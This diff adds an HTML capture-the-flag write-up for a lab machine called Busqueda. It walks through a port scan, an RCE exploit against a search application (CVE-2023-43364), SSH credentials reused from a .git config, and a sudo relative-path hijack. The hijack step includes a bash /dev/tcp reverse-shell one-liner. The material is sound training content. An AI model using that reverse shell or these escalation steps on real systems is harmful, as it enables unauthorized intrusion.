@@ -1,0 +1,142 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Busqueda</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
+</head>
+<body>
+  <div class="page">
+    <h1 class="title">Busqueda</h1>
+
+    <section>
+      <h2>Initial Enumeration</h2>
+      <p>
+        I start by performing a full port scan against the target machine to identify
+        exposed services and potential attack vectors.
+      </p>
+
+      <pre><code>nmap -sV -sC -p- --open 10.10.11.208 -T4 -A -vv -oN scan.txt</code></pre>
+
+      <p>
+        After completing the scan, I add the target IP address to the
+        <code>/etc/hosts</code> file to properly resolve the hostname.
+      </p>
+
+      <p>
+        At first glance, the web application appears to be a search engine.
+        This suggests that user input may be directly interacting with a database,
+        making it a potential candidate for a <strong>SQL Injection</strong>.
+      </p>
+    </section>
+
+    <section>
+      <h2>Web Application Analysis</h2>
+      <p>
+        I intercept the search request using <strong>Burp Suite</strong> and notice
+        that the backend processes the request via a PHP script.
+      </p>
+
+      <img src="images/87-1.png" alt="Intercepted search request">
+
+      <p>
+        At the bottom of the page, I identify the application version,
+        which helps narrow down potential vulnerabilities.
+      </p>
+
+      <img src="images/87-2.png" alt="Application version">
+
+      <p>
+        Further investigation reveals that the application generates URLs for
+        multiple search engines based on user input.
+      </p>
+
+      <p>
+        This functionality is vulnerable to <strong>Remote Code Execution</strong>,
+        specifically <strong>CVE-2023-43364</strong>.
+      </p>
+    </section>
+
+    <section>
+      <h2>Remote Code Execution</h2>
+      <p>
+        By exploiting the RCE vulnerability, I successfully execute arbitrary
+        commands on the target system and establish a reverse shell.
+      </p>
+
+      <img src="images/87-3.png" alt="Reverse shell obtained">
+
+      <p>
+        Once access is gained, I locate the <code>user.txt</code> flag.
+      </p>
+    </section>
+
+    <section>
+      <h2>Post-Exploitation & Lateral Movement</h2>
+      <p>
+        With initial access established, I begin system enumeration to identify
+        potential privilege escalation vectors.
+      </p>
+
+      <p>
+        I typically start by enumerating the web application directory.
+        Inside a <code>.git</code> directory, I find a configuration file containing
+        credentials that allow me to authenticate via <strong>SSH</strong>.
+      </p>
+
+      <img src="images/87-4.png" alt="Credentials found in .git">
+
+      <p>
+        These credentials also allow me to upgrade my shell to a more stable
+        SSH session.
+      </p>
+
+      <img src="images/87-5.png" alt="SSH access">
+
+      <p>
+        Running <code>sudo -l</code> reveals that I can execute a specific command
+        as the <strong>root</strong> user.
+      </p>
+
+      <img src="images/87-6.png" alt="sudo privileges">
+    </section>
+
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>
+        After researching the allowed command, I determine how to exploit it
+        to gain root privileges.
+      </p>
+
+      <img src="images/87-7.png" alt="Command execution as root">
+
+      <p>
+        Although I do not have direct permission to modify the existing files,
+        I notice that the script does not use an absolute path.
+      </p>
+
+      <img src="images/87-8.png" alt="File permissions">
+
+      <p>
+        This allows me to create a malicious script in the current working directory
+        with the same name, causing it to be executed instead.
+        Initially, I encounter errors because the script lacks execution permissions.
+      </p>
+
+      <img src="images/87-9.png" alt="Execution permission issue">
+
+      <p>
+        After fixing the permissions, I embed a reverse shell payload into the script:
+      </p>
+
+      <pre><code>bash -i >& /dev/tcp/&lt;YourIP&gt;/&lt;PORT&gt; 0>&amp;1</code></pre>
+
+      <p>
+        Executing the script grants me a reverse shell as <strong>root</strong>,
+        completing the privilege escalation.
+      </p>
+    </section>
+  </div>
+</body>
+</html>
